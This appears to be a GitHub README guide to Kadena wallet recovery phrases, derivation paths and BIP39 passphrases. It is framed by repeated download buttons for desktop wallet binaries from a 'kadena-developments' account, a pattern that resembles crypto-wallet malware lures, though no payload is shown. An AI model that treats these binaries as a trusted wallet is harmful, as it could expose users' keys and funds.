![Kadena Wallet](assets/banner-article.png)

<h1 align="center">12 Words, 24 Words, and the Passphrase in Between</h1>

<p align="center">A Kadena Wallet guide to keys, backups and devices.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Recovery phrases come in different lengths, and the length is not a measure of security. It is a product of which standard a wallet chose, and it tells you almost nothing about whether a given phrase will open a given account. What decides that is derivation, and what silently changes it is the passphrase.

This is the part of recovery that produces the most confident wrong answers, usually from someone who restored a phrase successfully once and concluded the rule is universal.

## You'll see this if

- Your old wallet used 12 words and your new one asks for 24, or the reverse.
- You restored a phrase and got an empty account with a valid-looking address.
- A wallet offered an "advanced" or "passphrase" option and you are unsure what it does.
- You are writing down a backup and want to record the right things.

## Why the counts differ

BIP39 defines mnemonic lengths of 12, 18 and 24 words, each encoding a different amount of entropy. Wallets pick one. A 12-word phrase carries 128 bits, a 24-word phrase carries 256, and both are far beyond brute force. The difference is margin, not adequacy.

Kadena adds a wrinkle of its own. Chainweaver did not use a standard BIP44 path on a 12-word phrase; it derived from Kadena's legacy master-seed scheme. So a 12-word phrase from Chainweaver and a 12-word phrase from a BIP39 wallet can look identical and control entirely different accounts.

## What each wallet in this ecosystem uses

| Wallet | Phrase | Derivation note |
| --- | --- | --- |
| Chainweaver | 12 words | Legacy master-seed scheme, not a standard path |
| eckoWALLET | 12 words | `m/44'/626'/0'/0/{index}` |
| Koala | 24 words | First account `m/44'/626'/0'` |
| Zelcore | 12, 18 or 24 words, 24 by default | BIP39, with `k:` and legacy accounts |
| Ledger | The device's own phrase | Paths chosen by the connecting interface |

Two rows explain most of the confusion in this list. Koala's 24 words and ecko's 12 words are not interchangeable, and neither is a drop-in replacement for a Chainweaver phrase even when the count matches.

## Count is not compatibility

A wallet will usually accept a phrase whose word count it supports. Acceptance means the checksum passed and the words are valid BIP39. It does not mean the wallet derived the keys that control your accounts.

That distinction is the most useful thing here. A restored phrase producing a fresh, empty account is not evidence of a wrong phrase. It is evidence of a derivation mismatch, and the fix is different software or a different path, not a different phrase.

## The passphrase, which is not the phrase

BIP39 allows an optional passphrase, often called the 25th word. It is not stored in the mnemonic and not recoverable from it. It is combined with the phrase to produce a different seed.

Three consequences follow, and they are severe in the right order.

- **Same words, different accounts.** Entering the phrase alone opens a valid set of accounts that has never held funds. Everything looks correct and everything is empty.
- **No hint on the device.** A hardware wallet does not tell you a passphrase was set. Restoring the same words elsewhere simply produces the empty set.
- **No recovery path.** Forget the passphrase and the accounts behind it are unreachable, exactly as if the phrase had been lost.

If you set one, note the fact somewhere apart from the phrase. The phrase is not the whole secret in that configuration, and a backup that omits the fact is a backup of the wrong thing.

A device makes this worse rather than better. A hardware wallet does not display whether a passphrase was used, so a restore on new hardware reproduces the empty account set and reports success. The only warning arrives as a balance nobody can explain, which is why the note matters more than the memory.

## What to record beside the words

A phrase alone is an incomplete note. The things that turn it into a working restore:

1. **The word count**, because a wallet that expects 24 will not accept 12.
2. **The wallet it came from**, because that determines the derivation.
3. **Which accounts and chains held balances**, which is what you will compare against after restoring.
4. **Whether a passphrase exists**, without recording the passphrase in the same place.
5. **The date**, because derivation conventions changed over time and the date narrows which one applied.

None of those items is secret in the way the phrase is. All of them are the difference between a restore that takes ten minutes and one that takes a week.

## If the counts do not match

You cannot convert a 12-word phrase into 24 words. They encode different entropy, and no wallet can stretch one into the other. What you can do is use software that supports the original count and the original derivation.

- **12 words from Chainweaver.** Use software that implements the legacy scheme, or a wallet that documents Chainweaver import.
- **24 words from Koala.** Aim for a wallet that documents Koala import, such as Linx, or one whose derivation matches.
- **Anything with a passphrase.** Supply it during import, or accept that you are looking at the wrong account set.

## FAQ

**Is 24 words safer than 12?**
Both are far beyond feasible brute force. 24 gives more margin against a future advance, and neither protects against a phrase that is photographed, typed into a website or stored in one place.

**Can I shorten a 24-word phrase to 12?**
No. The extra words are entropy, not padding.

**Why did my 12-word phrase open an empty account?**
Almost certainly derivation. The words are valid; the software built different keys than the ones that funded the account.

**Does a passphrase change the words?**
No. It changes the seed derived from them, which changes every account.

**Where should the passphrase be stored?**
Separately from the phrase, and never in the same place. Two secrets in one location are one secret.

## Related reading

- Lost seed phrase: what Kadena Wallet can and cannot recover
- Importing a Chainweaver seed into Kadena Wallet
- Backing up Kadena Wallet: a restore you have tested
- Legacy accounts and k: addresses: why both still exist

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Lost Seed Phrase: What Kadena Wallet Can and Cannot Recover](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/recover-lost-seed-phrase-in-kadena-wallet.md)
- [Importing a Chainweaver Seed into Kadena Wallet](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/import-chainweaver-seed-into-kadena-wallet.md)
- [eckoWALLET to Kadena Wallet: What Carries Over](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/eckowallet-to-kadena-wallet-migration.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
